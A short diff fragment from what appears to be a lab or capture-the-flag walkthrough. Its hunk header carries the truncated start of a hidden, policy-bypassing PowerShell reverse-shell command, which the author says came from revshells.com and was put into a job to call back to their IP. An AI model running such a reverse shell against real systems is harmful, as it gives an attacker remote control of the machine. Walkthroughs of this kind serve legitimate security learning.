@@ -190,3 +190,4 @@ powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Socke
 ```
 Ill add this command i got from revshells.com to connect back to my IP address
 
+Then ill save then re enable the job and see if i get a connection back!
